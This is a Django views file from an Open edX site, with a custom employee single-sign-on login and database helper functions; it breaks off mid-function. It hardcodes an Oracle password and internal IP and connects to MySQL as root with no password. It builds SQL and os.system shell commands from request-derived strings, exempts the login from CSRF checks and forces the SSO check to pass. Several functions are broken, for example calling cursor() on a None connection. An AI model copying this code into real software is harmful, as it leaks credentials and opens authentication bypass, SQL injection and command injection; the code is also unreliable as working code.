# encoding: utf-8

"""Views for the branding app. """
import logging
import urllib

from django.conf import settings
from django.contrib.staticfiles.storage import staticfiles_storage
from django.core.cache import cache
from django.urls import reverse
from django.db import transaction
from django.http import Http404, HttpResponse
from django.shortcuts import redirect
from django.utils import translation
from django.utils.translation.trans_real import get_supported_language_variant
from django.views.decorators.cache import cache_control
from django.views.decorators.csrf import ensure_csrf_cookie

import branding.api as branding_api
import courseware.views.views
import student.views
from edxmako.shortcuts import marketing_link, render_to_response
from openedx.core.djangoapps.lang_pref.api import released_languages
from openedx.core.djangoapps.site_configuration import helpers as configuration_helpers
from util.cache import cache_if_anonymous
from util.json_request import JsonResponse

import os
import common.kotechseed128 as kotechseed128
import requests
from django.contrib.auth import login as django_login
from django.contrib.auth.models import User
from django.contrib.auth.hashers import make_password
import cx_Oracle as ora

import hashlib
import subprocess
import datetime
from django.views.decorators.csrf import csrf_exempt

import MySQLdb as mdb

log = logging.getLogger(__name__)

#@cache_if_anonymous()
@ensure_csrf_cookie
@transaction.non_atomic_requests
@csrf_exempt
def index(request):
    """
    Redirects to main page -- info page if user authenticated, or marketing if not
    """
    #sso module for mobis
    #user_sso_process(request)
    #def user_sso_process(request):

    """
    user SSO(Single Sign On) Checking
    """
    MOBIS_SSO_CHECK_URL = 'http://mobis.benecafe.co.kr/login/mobis/sso/OpenCommLogin.jsp'
    MOBIS_BASE_URL = 'http://www.mobis.co.kr'
    MOBIS_EMAIL = "mobis.co.kr"
    pass_chk = True
    upk = ['', '']
    user_nm = u''

    logging.info('login SSO check module : %s', 'start')
    if not request.user.is_authenticated:
        try:
            logging.info('%s', 'views.py def index step 1')
            if 1 == 1:
                if request.method == 'POST':
                    usekey = request.POST.get('usekey')  # usekey : emp_no (ex: 2018092011)
                    memid = request.POST.get('memid')    # memid  : emp_no (ex: 2018092011)
                    logging.info('login SSO check module : POST', 'start')
                else:
                    usekey = request.GET.get('usekey')  # usekey : emp_no (ex: 2018092011)
                    memid = request.GET.get('memid')    # memid  : emp_no (ex: 2018092011)
                    logging.info('login SSO check module : GET', 'start')
    
                if request.method == 'POST':
                    RE_LOAD = "http://swa.mobis.co.kr/?usekey=" + usekey + "&memid=" + memid
                    logging.info('---------------> %s ', RE_LOAD)
                    return redirect(RE_LOAD)

                if usekey is None or memid is None:
                    logging.info('%s usekey or memid no data', 'views.py def index step E1')
                    return redirect(MOBIS_BASE_URL)

                usekey = usekey.replace(' ', '+')
                memid = memid.replace(' ', '+')

                logging.info('%s : usekey --> %s, memid --> %s', 'views.py def index step 2', usekey, memid)

                chk = False
                if usekey is not None and memid is not None:
                    if len(memid) == 23:
                        memid = '+' + memid 
                    if len(usekey) == 24 and len(memid) == 24:
                        chk = True

                if not chk:
                    logging.info('%s usekey or memid lenth error', 'views.py def index step E2')
                    return redirect(MOBIS_BASE_URL)

                try:
                    seed128 = kotechseed128.SEED()
                    logging.info('%s kotechseed128 class error', 'views.py def index step 3')
                except:
                    logging.info('%s kotechseed128 class error', 'views.py def index step E3')
                    return redirect(MOBIS_BASE_URL)
                    
                try:
                    logging.info('%s session setting', 'views.py def index step 4')
                    request.session['mobis_usekey'] = usekey
                    request.session['mobis_memid'] = memid
                except:
                    logging.info('%s session setting error', 'views.py def index step E4')
                    request.session['mobis_usekey'] = ''
                    request.session['mobis_memid'] = ''
                    return redirect(MOBIS_BASE_URL)
                  
                try:
                    logging.info('%s make_usekey_decryption', 'views.py def index step 5')
                    decdata = seed128.make_usekey_decryption(1, usekey, memid)
                except:
                    logging.info('%s make_usekey_decryption error', 'views.py def index step E5')
                    return redirect(MOBIS_BASE_URL)

                if decdata is None:
                    logging.info('%s make_usekey_decryption no data', 'views.py def index step E6')
                    return redirect(MOBIS_BASE_URL)

                seqky = decdata[0]    # usekey
                seqid = decdata[1]    # emp_no
                seqid = seqid.replace('\x00', '')

                logging.info('%s Confirm decoding: usekey= %s, memid= %s', 'views.py def index step 6', seqky, seqid)

                request.session['cms_is_staff'] = ''
                _email = seqid + "@" + MOBIS_EMAIL
                is_staff = getLoginAPIdecrypto(_email)
                logging.info('cms_is_staff: is_staff= %s', is_staff)
                request.session['cms_is_staff'] = is_staff

                rt = getCrypto(request)
                logging.info('%s : getCrypto', 'views.py def index step 7')

                #key matching check
                if not usekey_check(seqky):
                    logging.info('%s : usekey_check seqky: %s', 'views.py def index step E7', seqky)
                    return redirect(MOBIS_BASE_URL)

                # seed encryption
                if seqid is not None:
                    if len(seqid) > 6 and len(seqid) < 17:
                        # parameter : user id, fixed length 10 bytes
                        upk = seed128.make_usekey_encryption(1, seqid, seqky)   # upk : usekey
                        logging.info('%s : make_usekey_encryption', 'views.py def index step 8')
                    else:
                        logging.info('%s : id length error', 'views.py def index step E8')
                        return redirect(MOBIS_BASE_URL)
                else:
                    logging.info('%s : seqid None', 'views.py def index step E9')
                    return redirect(MOBIS_BASE_URL)

                payload = {}
                payload['usedkey'] = upk[0]
                payload['memID'] = upk[1]

                logging.info('%s Confirm decoding: usekey= %s, memid= %s', 'views.py def index step 9', upk[0], upk[1])

                r = requests.get(MOBIS_SSO_CHECK_URL, params=payload)
                res = r.text.upper()

                if not pass_chk:
                    if res.index("ERROR") > 0:
                        #print ("*** ERROR : ", res)
                        logging.info('Mobis SSO Confirm: %s', 'Error')
                        return redirect(MOBIS_BASE_URL)

                # true / false
                if pass_chk == True or res.index("TRUE") > 0:
                    # user exists check - mysql
                    # username is user_id of the Mobis view table
                    logging.info('%s Confirm User.objects.filter: email= %s', 'views.py def index step 10', _email)
                    o1 = User.objects.filter(email=_email)
                    if o1 is None:
                        logging.info('%s Confirm User.objects.filter error: email= %s', 'views.py def index step E10', _email)
                        return redirect(MOBIS_BASE_URL)

                    # if not exist on auth_user model, insert
                    if len(o1) == 0:
                        logging.info('%s human information checking', 'views.py def index step 11')
                        # account exists_check
                        rt = user_ora_exists_check(seqid)
                        # element count check
                        if len(rt) > 0:
                            #user_nm = unicode(rt[0][1])+'('+seqid+')' #USER_NM 홍길동(10000000) 형식으로 생성
                            user_nm = seqid #USER_NM 홍길동(10000000) 형식으로 생성
                        else:
                            # not exist user on Mobis emp master view
                            logging.info('%s no data in human information', 'views.py def index step E11')
                            return redirect(MOBIS_BASE_URL)

                        import uuid
                        # 32 bytes password
                        _uuid = uuid.uuid4().__str__()
                        _uuid = _uuid.replace('-', '')
                        cmd = 'export NLS_LANG=AMERICAN_AMERICA.UTF8'
                        result = os.system(cmd)
                        cmd = 'bash /edx/app/edxapp/edx-platform/add_user.sh {email} {password} {username}'.format(
                                   email=_email,
                                   password=_uuid,
                                   username = seqid)
                        logging.info('%s Shell script : %s', 'views.py def index step 12', cmd)
                        result = os.system(cmd)
                        # auth_user update
                        user_info_update(seqid, _email)

                    user = User.objects.get(email=_email)
                    user.backend = 'ratelimitbackend.backends.RateLimitModelBackend'
                    django_login(request, user)
                    logging.info('%s : django_login', 'views.py def index step 13')

                else:
                    return redirect(MOBIS_BASE_URL)
            else:
                logging.info('%s go force mobis site', 'views.py def index step E13')
                request.session['mobis_usekey'] = ''
                request.session['mobis_memid'] = ''
                return redirect(MOBIS_BASE_URL)
        except Exception as e:
            logging.info('%s except error : %s', 'views.py def index step E14', e)
            request.session['mobis_usekey'] = ''
            request.session['mobis_memid'] = ''
            return redirect(MOBIS_BASE_URL)
        finally:
            logging.info('login SSO check module : %s', 'end')

    if request.user.is_authenticated:
        rt = getCrypto(request)
        # Only redirect to dashboard if user has
        # courses in his/her dashboard. Otherwise UX is a bit cryptic.
        # In this case, we want to have the user stay on a course catalog
        # page to make it easier to browse for courses (and register)
        if configuration_helpers.get_value(
                'ALWAYS_REDIRECT_HOMEPAGE_TO_DASHBOARD_FOR_AUTHENTICATED_USER',
                settings.FEATURES.get('ALWAYS_REDIRECT_HOMEPAGE_TO_DASHBOARD_FOR_AUTHENTICATED_USER', True)):
            # return redirect(reverse('dashboard'))
            pass

    if settings.FEATURES.get('AUTH_USE_CERTIFICATES'):
        from openedx.core.djangoapps.external_auth.views import ssl_login
        # Set next URL to dashboard if it isn't set to avoid
        # caching a redirect to / that causes a redirect loop on logout
        if not request.GET.get('next'):
            req_new = request.GET.copy()
            req_new['next'] = reverse('dashboard')
            request.GET = req_new
        return ssl_login(request)

    enable_mktg_site = configuration_helpers.get_value(
        'ENABLE_MKTG_SITE',
        settings.FEATURES.get('ENABLE_MKTG_SITE', False)
    )

    if enable_mktg_site:
        marketing_urls = configuration_helpers.get_value(
            'MKTG_URLS',
            settings.MKTG_URLS
        )
        return redirect(marketing_urls.get('ROOT'))

    domain = request.META.get('HTTP_HOST')

    # keep specialized logic for Edge until we can migrate over Edge to fully use
    # configuration.
    if domain and 'edge.edx.org' in domain:
        return redirect(reverse("signin_user"))

    #  we do not expect this case to be reached in cases where
    #  marketing and edge are enabled


    return student.views.index(request, user=request.user)


def getCrypto(request):
    temp_user = "%s" % (request.user)

    request.session['cms_user_val'] = ''
    request.session['cms_pubk_val'] = ''

    logging.info('views.py def getCrypto index user: %s', temp_user)
    logging.info('views.py def getCrypto index user type check: %s', type(temp_user))
    try:
        se = kotechseed128.SEED()
        encdata=se.make_usekey_encryption(1, temp_user, '194508151504')
    except:
        logging.info('views.py def getCrypto error : %s', temp_user)
        return False

    cms_pubk_val = encdata[0]
    cms_user_val = encdata[1]
    logging.info('encryption user : %s', cms_user_val)
    logging.info('encryption  key : %s', cms_pubk_val)
    try:
        decdata = se.make_usekey_decryption(1, cms_pubk_val, cms_user_val)
    except:
        logging.info('views.py def getCrypto make_usekey_decryption: %s', temp_user)
        return False

    logging.info('views.py def getCrypto decryption user : %s', decdata[1])
    logging.info('views.py def getCrypto decryption  key : %s', decdata[0])

    try:
        request.session['cms_user_val'] = cms_user_val
        request.session['cms_pubk_val'] = cms_pubk_val
    except:
        request.session['cms_user_val'] = ''
        request.session['cms_pubk_val'] = ''
        logging.info('index seed128 session error : %s', temp_user)
        return False

    return True

def getSession(request):
    #using id check session
    json_return = {}
    json_return['status'] = 'false'
    if request.user.is_authenticated:
        json_return['status'] = 'true'
    return JsonResponse(json_return)

def getAuthCheck(request):
    json_return = {}
    json_return['status'] = 'false'

    cmsstr = request.GET.get('cmsstr')

    try:
        if cmsstr is None:
            logging.info('cmsstr None error %s', 'views.py getAuthCheck method')
            json_return['status'] = 'false'
        else:
            #check
            #o1 = User.objects.filter(username=cmsstr)
            o1 = User.objects.filter(email=cmsstr)
            if o1 is None:
                json_return['status'] = 'false'
            else:
                if len(o1) == 0:
                    json_return['status'] = 'false'
                else:
                    json_return['status'] = 'true'
        return JsonResponse(json_return)
    except:
        json_return['status'] = 'false'
        return JsonResponse(json_return)

def getAuthUserCheck(request):
    json_return = {}
    json_return['status'] = 'false'

    cmsstr = request.GET.get('cmsstr')

    try:
        if cmsstr is None:
            logging.info('cmsstr None error %s', 'views.py getAuthUserCheck method')
            json_return['status'] = 'false'
        else:
            #check
            o1 = User.objects.filter(username=cmsstr)
            if o1 is None:
                json_return['status'] = 'false'
            else:
                if len(o1) == 0:
                    json_return['status'] = 'false'
                else:
                    json_return['status'] = 'true'

        return JsonResponse(json_return)

    except:
        json_return['status'] = 'false'
        return JsonResponse(json_return)

def getAuthEmailCheck(request):
    json_return = {}
    json_return['status'] = 'false'

    cmsstr = request.GET.get('cmsstr')

    try:
        if cmsstr == None:
            logging.info('cmsstr None error %s', 'views.py getAuthEmailCheck method')
            json_return['status'] = 'false'
        else:
            #check
            o1 = User.objects.filter(email=cmsstr)
            if o1 == None:
                json_return['status'] = 'false'
            else:
                if len(o1) == 0:
                    json_return['status'] = 'false'
                else:
                    json_return['status'] = 'true'

        return JsonResponse(json_return)

    except:
        json_return['status'] = 'false'
        return JsonResponse(json_return)

def getSeed128(request):
    #using id check session
    json_return = {}
    json_return['status'] = 'false'
    json_return['decstr'] = ''
    json_return['error'] = 'fail'

    usekey = request.GET.get('usekey')
    memid = request.GET.get('memid')

    try:
        if usekey == None or memid == None:
            logging.info('usekey None error %s', 'views.py getSeed128 method')
            json_return['decstr'] = 'parameter'
        else:
            usekey = usekey.replace(' ', '+')
            memid = memid.replace(' ', '+')

            if usekey != None and memid != None:
                if len(memid) == 23:
                    memid = '+' + memid 
                if len(usekey) == 24 and len(memid) == 24:
                    try:
                        seed128 = kotechseed128.SEED()
                        decdata = seed128.make_usekey_decryption(1, usekey, memid)
                    except:
                        logging.info('except error %s', 'views.py getSeed128 method - make_usekey_decryption')
                        return JsonResponse(json_return)

                    if decdata == None:
                        json_return['status'] = 'true'
                        json_return['decstr'] = ''
                    else:
                        seqky = decdata[0]    # usekey
                        seqid = decdata[1]    # emp_no
                        seqid = seqid.replace('\x00', '')

                        json_return['status'] = 'true'
                        json_return['decstr'] = seqid
                        json_return['error'] = 'success'
                else:
                    json_return['decstr'] = ''
                    json_return['error'] = 'length error'
            else:
                json_return['decstr'] = 'parameter'
                json_return['error'] = 'fail'

        logging.info('finish %s', 'views.py getSeed128 method')
        return JsonResponse(json_return)

    except:
        json_return['status'] = 'false'
        json_return['decstr'] = 'internal error'
        json_return['error'] = 'fail'
        return JsonResponse(json_return)

def getLoginAPIdecrypto(email):
    con = None
    # MySQL Connection 연결
    #con = mdb.connect(settings.DATABASES.get('default').get('HOST'),
    #                 settings.DATABASES.get('default').get('USER'),
    #                 settings.DATABASES.get('default').get('PASSWORD'),
    #                 settings.DATABASES.get('default').get('NAME'),
    #                 charset='utf8')

    con = mdb.connect(host='localhost', user='root', passwd='', db='edxapp', charset='utf8')

    try:
        # Connection 으로부터 Cursor 생성
        cur = con.cursor()
        # username check
        # login 하는 경우에는 사번만 존재한다.

        # SQL문 실행

        sql = """
              select count(*) cnt
              from student_courseaccessrole a
                       left outer join (
                           select id, is_staff from auth_user
                           where email = \'{email}\'
                           ) b on a.user_id = b.id
              where a.user_id = b.id
              """.format(email=email)

        logging.info('sql1 ------ %s', sql)
        cur.execute(sql)
        row_cnt = cur.fetchall()
        cnt_flag = False
        cnt_count = 0
        for row in row_cnt:
            cnt_count = row[0]
            cnt_flag = True
            break

        sql = """
              select is_staff from auth_user
              where email = \'{email}\'
        """.format(email=email)

        if cnt_flag:
            if cnt_count > 0:
                sql = """
                    select
                            case when is_staff = '1' then '1'
                                 else 
                                    case when is_staff = '0' and cnt1 = '1' then '1'
                                         else
                                            case when is_staff = '0' and cnt2 = '1' then '2'
                                                 else
                                                        '0'
                                                 end
                                         end
                                 end is_staff
                    from (
                                select 
                                        b.is_staff is_staff
                                        ,case when role = 'staff' and count(*) > 0 then '1' else '0' end  cnt1
                                ,case when role = 'instructor' and count(*) > 0 then '1' else '0' end cnt2
                                from student_courseaccessrole a 
                                           left outer join (
                                               select id, is_staff from auth_user
                                               where email = \'{email}\'
                                               ) b on a.user_id = b.id
                                where a.user_id = b.id
                    ) tb
                """.format(email=email)

        logging.info('sql2 ------ %s', sql)

        cur.execute(sql)
        rows = cur.fetchall()
        exists_flag = False
        teacher_count = ''
        for row in rows:
            teacher_count = row[0]
            exists_flag = True
            break
        if exists_flag:
            logging.info("Teacher count %d record(s) affected", teacher_count)
        else:
            logging.info("Teacher count %d record(s) affected", 0)
        return teacher_count
    except mdb.Error, e:
        logging.info('getLoginAPIdecrypto method MySQL: %s', e)
        return '0'
    finally:
        # Connection 닫기
        if cur is not None:
            cur.close()
        if con is not None:
            con.close()

def usekey_check(ukey):

    # utcnow = datetime.datetime.utcnow()
    # time_gap = datetime.timedelta(hours=9)
    # dt = utcnow + time_gap
    # wk = dt.weekday()+2

    dt = datetime.datetime.now()
    wk = datetime.datetime.today().weekday() + 2
    if wk > 7:
        wk = 1
    pkey = '%s%s%s%s%s' % (
    '{0:04d}'.format(dt.year), '{0:02d}'.format(dt.month), '{0:02d}'.format(dt.day), '{0:02d}'.format(dt.day),
    '{0:02d}'.format(wk))

    msg = ''
    if ukey == pkey:
        msg = """match in[{ukey}], out[{pkey}]""".format(ukey=ukey, pkey=pkey)
        logging.info('usekey_check: %s', msg)
        return True 
    else:
        msg = """not match in[{ukey}], out[{pkey}]""".format(ukey=ukey, pkey=pkey)
        logging.info('usekey_check: %s', msg)
        return False

def user_ora_exists_check(seqid):
    try:
        db = None
        cur = None
        results = []

        gMobis = True
        if gMobis:
            MOBIS_DB_USR = 'SWAUSER'
            MOBIS_DB_PWD = 'mbora#SW252'
            MOBIS_DB_SID = 'mobispdm'
            MOBIS_DB_IP = '10.230.22.252'
            MOBIS_DB_PORT = '1521'
        else:
            MOBIS_DB_USR = 'scott'
            MOBIS_DB_PWD = 'tiger'
            MOBIS_DB_SID = 'XE'
            MOBIS_DB_IP = 'localhost'
            MOBIS_DB_PORT = '1521'

        # dsn = ora.makedsn(MOBIS_DB_IP, MOBIS_DB_PORT, MOBIS_DB_SID)
        # db = ora.connect(MOBIS_DB_USR, MOBIS_DB_PWD, dsn)
        # db = ora.connect("scott/tiger@127.0.0.1/XE")
        # con = ora.connect("SWAUSER", "mbora#SW252", "10.230.22.252:1521/mobispdm")
        _connectString = "{0}:{1}/{2}".format(MOBIS_DB_IP, MOBIS_DB_PORT, MOBIS_DB_SID)
        con = ora.connect(MOBIS_DB_USR, MOBIS_DB_PWD, _connectString)
        os.putenv('NLS_LANG', 'UTF8')
        cur = db.cursor()

        # get one row
        query = """
                    SELECT
                         USER_ID
                        ,NVL(USER_KN,\'\') USER_KN
                        ,NVL(USER_EN,\'\') USER_EN
                        ,NVL(ORGTX_DIV,\'\') ORGTX_DIV
                        ,NVL(DEPT_NM,\'\') DEPT_NM
                        ,NVL(POSN_NM,\'\') POSN_NM
                    FROM MERP.VW_USER_IM
                    WHERE USER_ID = \'{seqid}\'
                    AND   ROWNUM = 1
                """.format(seqid=seqid)

        # WFUSER.VW_HISTORY_SWA
        # mih delete logging
        # logging.info('query: %s', query)
        cur.execute(query)

        for row in cur.fetchall():
            results.append(row)

        return results

    except ora.DatabaseError as e:
        #print e
        logging.info('Oracle SQL: %s', e)

    finally:
        # cursor and connection close
        if cur is not None:
            cur.close()
        if db is not None:
            db.close()

def user_ora_human_update(rnn_go):
    #http://localhost:18000/userhumanupdate?rnn_go=1
    #import os
    try:
        db = None
        cur = None
        mycon = None
        mycur = None

        results = []

        gMobis = True
        if gMobis:
            MOBIS_DB_USR = 'SWAUSER'
            MOBIS_DB_PWD = 'mbora#SW252'
            MOBIS_DB_SID = 'mobispdm'
            MOBIS_DB_IP = '10.230.22.252'
            MOBIS_DB_PORT = '1521'
        else:
            MOBIS_DB_USR = 'scott'
            MOBIS_DB_PWD = 'tiger'
            MOBIS_DB_SID = 'XE'
            MOBIS_DB_IP = 'localhost'
            MOBIS_DB_PORT = '1521'

        _connectString = "{0}:{1}/{2}".format(MOBIS_DB_IP, MOBIS_DB_PORT, MOBIS_DB_SID)
        con = ora.connect(MOBIS_DB_USR, MOBIS_DB_PWD, _connectString)
        os.putenv('NLS_LANG', 'UTF8')
        cur = db.cursor()

        # get one row
        query = """
                    SELECT
                         USER_ID
                        ,NVL(USER_KN,\'\') USER_KN
                        ,NVL(USER_EN,\'\') USER_EN
                        ,NVL(ORGTX_DIV,\'\') ORGTX_DIV
                        ,NVL(DEPT_NM,\'\') DEPT_NM
                        ,NVL(POSN_NM,\'\') POSN_NM
                    FROM MERP.VW_USER_IM
                    ORDER BY USER_ID ASC
                """

        # MERP.VW_USER_IM
        logging.info('query: %s', query)
        cur.execute(query)

        for row in cur.fetchall():
            results.append(row)

        mycon = None
        #mycon = mdb.connect(settings.DATABASES.get('default').get('HOST'),
        #                  settings.DATABASES.get('default').get('USER'),
        #                  settings.DATABASES.get('default').get('PASSWORD'),
        #                  settings.DATABASES.get('default').get('NAME'),
        #                  charset='utf8')

        mycon = mdb.connect(host='localhost', user='root', passwd='', db='edxapp', charset='utf8')

        # Connection 으로부터 Cursor 생성
        mycur = mycon.cursor()
        #mycon, mycur = user_human_connect()

        # MySQL Insert processing
        for row in results:
            user_id = row[0]    # USER_ID
            user_nm = row[1]    # USER_KN
            #username = user_nm + '('+user_id+')'
            email = user_id+'@mobis.co.kr'    # email
            logging.info("****user_id:%s, user_nm: %s, email: %s", user_id, user_nm, email)
            user_human_update(mycon, mycur, user_nm, user_id, email)

        json_return = {}
        json_return['status'] = 'OK'
        return JsonResponse(json_return)

    except ora.DatabaseError as e:
        logging.info('Oracle SQL: %s', e)
        json_return = {}
        json_return['status'] = 'fail'
        return JsonResponse(json_return)
    finally:
        if mycur is not None:
            mycur.close()
        if mycon is not None:
            mycon.close()
        # cursor and connection close
        if cur is not None:
            cur.close()
        if db is not None:
            db.close()

def user_human_connect():
    con = None
    #con = mdb.connect(settings.DATABASES.get('default').get('HOST'),
    #                  settings.DATABASES.get('default').get('USER'),
    #                  settings.DATABASES.get('default').get('PASSWORD'),
    #                  settings.DATABASES.get('default').get('NAME'),
    #                  charset='utf8')

    con = mdb.connect(host='localhost', user='root', passwd='', db='edxapp', charset='utf8')

    # Connection 으로부터 Cursor 생성
    logging.info("views.py def index user_human_connect", "test")
    cur = con.cursor()
    return con, cur

def user_human_disconnect(con, cur):
    # Connection 닫기
    if cur is not None:
        cur.close()
    if con is not None:
        con.close()
    return con

def user_human_update(con, cur, user_nm, username, email):
    # user_human_update(mycon, mycur, user_nm, user_id, email)
    try:
        # SQL문 실행
        #user_id = 0
        sql = """
              select id from auth_user where email = \'{email}\'
              """.format(email=email)
        cur.execute(sql)

        # 데이타 Fetch
        rows = cur.fetchall()
        exists_flag = False
        for row in rows:
            id = row[0]
            exists_flag = True
            break

        if exists_flag:
            sql1 = """
                  update auth_user set username = \'{username}\', last_name = \'{last_name}\' where email = \'{email}\'
                  """.format(username=username, last_name=user_nm, email=email)
            cur.execute(sql1)
            # print cur.rowcount, "record(s) affected"
            logging.info("views.py def index user_human_update : %d record(s) affected", cur.rowcount)

            sql2 = """
                  update auth_userprofile set name = \'{user_nm}\' where user_id = {id}
                  """.format(user_nm=user_nm, id=id)
            cur.execute(sql2)
            con.commit()
            #print cur.rowcount, "record(s) affected"
            logging.info("views.py def index user_human_update : %d record(s) affected", cur.rowcount)
        else:
            #print "0 record(s) affected"
            logging.info("views.py def index user_human_update : %s record(s) affected", '0')
            # if u not fuound, insert in mysql
            import uuid
            # 32 bytes password
            _uuid = uuid.uuid4().__str__()
            _uuid = _uuid.replace('-', '')

            cmd = 'bash /edx/app/edxapp/edx-platform/add_user.sh {email} {password} {username}'.format(
                email=email,
                password=_uuid,
                username=username)
            logging.info('%s Shell script : %s', 'views.py def index user_human_update', cmd)
            result = os.system(cmd)
            # auth_user update
            user_human_info_update(con, cur, user_nm, email)

    except mdb.Error, e:
        logging.info('views.py def index user_human_update MySQL: %s', e)

def user_human_info_update(con, cur, user_nm, email):
    try:
        # SQL문 실행
        user_id = 0
        sql = """
              select id from auth_user where email = \'{email}\'
              """.format(email=email)
        cur.execute(sql)

        # 데이타 Fetch
        rows = cur.fetchall()
        exists_flag = False
        for row in rows:
            id = row[0]     # 키로 사용되는 숫자 값
            exists_flag = True
            break

        if exists_flag:
            sql1 = """
                  update auth_user set last_name = \'{last_name}\' where email = {email}
                  """.format(last_name=user_nm, email=email)
            cur.execute(sql1)
            sql2 = """
                  update auth_userprofile set name = \'{user_nm}\' where user_id = {id}
                  """.format(user_nm=user_nm, id=id)
            cur.execute(sql2)
            con.commit()
            logging.info("views.py def index user_human_info_update : %d record(s) affected", cur.rowcount)
        else:
            logging.info("views.py def index user_human_info_update : %s record(s) affected", '0')
    except mdb.Error, e:
        logging.info('views.py def index user_human_update MySQL: %s', e)

def user_info_update(user_nm, email):
    con = None
    # MySQL Connection 연결
    #con = mdb.connect(settings.DATABASES.get('default').get('HOST'),
    #                 settings.DATABASES.get('default').get('USER'),
    #                 settings.DATABASES.get('default').get('PASSWORD'),
    #                 settings.DATABASES.get('default').get('NAME'),
    #                 charset='utf8')

    con = mdb.connect(host='localhost', user='root', passwd='', db='edxapp', charset='utf8')

    try:
        # Connection 으로부터 Cursor 생성
        cur = con.cursor()

        # SQL문 실행
        user_id = 0
        sql = """
              select id from auth_user where email = \'{email}\'
              """.format(email=email)
        cur.execute(sql)

        # 데이타 Fetch
        rows = cur.fetchall()
        exists_flag = False
        for row in rows:
            id = row[0]
            exists_flag = True
            break

        if exists_flag:
            sql1 = """
                  update auth_user set last_name = \'{last_name}\' where email = {email}
                  """.format(last_name=user_nm, email=email)
            cur.execute(sql1)
            sql2 = """
                  update auth_userprofile set name = \'{user_nm}\' where user_id = {id}
                  """.format(user_nm=user_nm, id=id)
            cur.execute(sql2)
            con.commit()
            #print cur.rowcount, "record(s) affected"
            logging.info("%d record(s) affected", cur.rowcount)
        else:
            #print "0 record(s) affected"
            logging.info("%s record(s) affected", '0')
    except mdb.Error, e:
        #print e
        logging.info('MySQL: %s', e)
    finally:
        # Connection 닫기
        if cur is not None:
            cur.close()
        if con is not None:
            con.close()

def getLoginAuthCheck(request):
    auth_check = {}
    auth_check['status'] = 'false'
    try:
        _str = request.GET.get('cmsstr')

        if _str == None:
            logging.info('getLoginAuthCheck: cmsstr None error %s', 'getLoginAuthCheck method checking')
        else:
            _type = '2'
            if _type=='1':
                o1 = User.objects.filter(username=_str)
            elif _type=='2':
                o1 = User.objects.filter(email=_str)

            if o1 == None:
                auth_check['status'] = 'false'
            else:
                if len(o1) == 0:
                    auth_check['status'] = 'false'
                else:
                    auth_check['status'] = 'true'

        logging.info("getLoginAuthCheck: _type: %s, _str: %s", _type, _str)
        logging.info("getLoginAuthCheck: status : %s", auth_check)

        return JsonResponse(auth_check)

    except Exception as e:
        logging.info("getLoginAuthCheck: error: %s", e)
        return JsonResponse(auth_check)


def getLoginAPI(request):
    json_return = {}
    json_return['memid'] = ''
    json_return['email'] = ''
    json_return['is_staff'] = ''
    json_return['status'] = 'fail'

    usekey = 'MTk0NTA4MTUxNTA0AAAAAA=='

    try:
        logging.info('Step %s', 'views.py getLoginAPI method')
        #usekey = request.session['usekey']
        #memid = request.POST.get('memid')
        memid = request.GET.get('memid')
        logging.info('getLoginAPI memid : %s', memid)

    except:
        logging.info('Error %s', 'views.py getLoginAPI method')
        return JsonResponse(json_return)

    #decrypto
    try:
        usekey = usekey.replace(' ', '+')
        memid = memid.replace(' ', '+')
        if len(memid) == 23:
            memid = '+' + memid
        usernm = getSeedDecData(usekey, memid)

        logging.info('usekey %s', usekey)
        logging.info('memid  %s', memid)

        json_return['memid'] = usernm
        email = usernm + '@mobis.co.kr'
        json_return['email'] = email
    #except:
    except Exception as e:
        logging.info('getSeedDecData Call Error %s', e)
        return JsonResponse(json_return)

    #mysql get data
    try:
        teacher = getLoginAPIdecrypto(email)
        json_return['is_staff'] = teacher
        json_return['status'] = 'success'
    except:
        logging.info('getLoginAPIdecrypto Call Error %s', 'views.py getLoginAPI method')
        return JsonResponse(json_return)

    logging.info('getLoginAPI Return Data %s', json_return)
    return JsonResponse(json_return)


def getSeedDecData(usekey, memid):

    logging.info('%s this is getSeedDecData !!!', 'views.py getSeed128 method')
    try:
        if usekey is None or memid is None:
            logging.info('usekey None error %s', 'views.py getSeed128 method')
        else:
            usekey = usekey.replace(' ', '+')
            memid = memid.replace(' ', '+')

            if usekey is not None and memid is not None:
                if len(memid) == 23:
                    memid = '+' + memid 
                if len(usekey) == 24 and len(memid) == 24:
                    try:
                        logging.info('kotechseed128 and seed128.make_usekey_decryption %s', 'getSeedDecData method')
                        seed128 = kotechseed128.SEED()
                        decdata = seed128.make_usekey_decryption(1, usekey, memid)
                    except:
                        logging.info('kotechseed128 and seed128.make_usekey_decryption error %s', 'getSeedDecData method')
                        return ''

                    if decdata is None:
                        return ''
                    else:
                        seqky = decdata[0]    # usekey
                        seqid = decdata[1]    # emp_no
                        seqid = seqid.replace('\x00', '')
                        logging.info('%s result ok', 'getSeedDecData method')
                        return seqid
                else:
                    logging.info('%s Length Error', 'getSeedDecData method')
                    return ''
            else:
                logging.info('%s None Error', 'getSeedDecData method')
                return ''

        logging.info('finish %s', 'getSeedDecData method')
        return JsonResponse(json_return)
    except:
        return ''

from django.contrib.auth.models import User
from opaque_keys.edx.keys import CourseKey
from lms.djangoapps.grades.course_grade_factory import CourseGradeFactory
from lms.djangoapps.grades.models import PersistentCourseGrade
from django.core.exceptions import ObjectDoesNotExist
from courseware.courses import get_course_with_access
from openedx.core.djangoapps.content.course_overviews.models import CourseOverview
#import MySQLdb as mdb
from bson.objectid import ObjectId
from pymongo import MongoClient
from django.db import connections

def cert(request):

    try:
        course_key_string = request.POST.get('id') # ex) course-v1:test+test+test

        course_key_string = 'course-v1:test+test+test' # DEBUG

        course_key = course_key_string
        course_key_string = course_key_string.replace('course-v1:', '')
        course_key_string = course_key_string.split('+')
    except BaseException:
        return JsonResponse({'result':'course key is not found'})

    o = course_key_string[0]
    c = course_key_string[1]
    r = course_key_string[2]

    try:
        database_ip = 'edx.devstack.mongo'
        client = MongoClient(database_ip, 27017)
        db = client.edxapp
    except BaseException:
        return JsonResponse({'result': 'mongo db connection error'})

    passPoint = None

    try:
        cursor_active_versions = db.modulestore.active_versions.find_one({'org': o, 'course': c, 'run': r})
        pb = cursor_active_versions.get('versions').get('published-branch')
        structure = db.modulestore.structures.find_one({'_id': ObjectId(pb)})
        blocks = structure.get('blocks')
        for block in blocks:
            block_type = block.get('block_type')
            if block_type == 'course':
                definition = block.get('definition')
                print('definition -> ', definition)
                score = db.modulestore.definitions.find_one({'_id': ObjectId(definition)})
                fields = score.get('fields')
                for n in fields:
                    if n == 'grading_policy':
                        print('n.GRADE_CUTOFFS -> ', fields['grading_policy']['GRADE_CUTOFFS']['Pass'])
                        passPoint = fields['grading_policy']['GRADE_CUTOFFS']['Pass']
                        break
                    else:
                        passPoint = '0.5'
    except BaseException:
